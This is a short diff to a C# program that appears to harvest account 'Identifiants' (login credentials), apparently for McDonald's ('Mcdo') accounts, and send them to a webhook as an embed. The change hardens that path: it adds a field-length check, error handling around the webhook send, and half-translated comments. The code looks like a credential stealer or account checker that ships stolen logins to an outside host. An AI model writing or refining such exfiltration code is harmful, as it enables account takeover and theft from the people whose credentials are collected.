@@ -242,24 +242,41 @@ namespace DataVortex
 
                                 if (!uniqueResults.Contains(resultString))
                                 {
-                                    sb.AppendLine($"`{resultString}`");
-                                    uniqueResults.Add(resultString);
+                                    if (sb.Length + resultString.Length > 1024)
+                                    {
+                                        // Handle the case where the field value is too long
+                                        Console.WriteLine($"The field value is too long: {resultString}");
+                                        // You can truncate or split the value here and add it to the embed in a way that fits within the limit.
+                                    }
+                                    else
+                                    {
+                                        sb.AppendLine($"`{resultString}`");
+                                        uniqueResults.Add(resultString);
+                                    }
                                 }
                             }
                         }
 
-                        // Vérifiez si le champ "Identifiants" contient des données
+                        // Vérifiez if the field "Identifiants" contains data and is within the length limit
                         if (sb.Length > 0)
                         {
-                            // Ajoutez le champ uniquement s'il contient des données
+                            // Add the field only if it contains data and is within the length limit
                             embed.AddField("Identifiants:", sb.ToString());
 
                             // Send the message via the webhook
-                            await client.SendMessageAsync(embeds: new[] { embed.Build() });
-                            Console.WriteLine("Embed Mcdo envoyé");
+                            try
+                            {
+                                await client.SendMessageAsync(embeds: new[] { embed.Build() });
+                                Console.WriteLine("Embed Mcdo envoyé");
+                            }
+                            catch (ArgumentException ex)
+                            {
+                                Console.WriteLine($"An exception occurred when sending the message: {ex.Message}");
+                            }
                         }
                     }
                 }
+
 
                 public static string FindAccountDetails(string accountIdentifier)
                 {
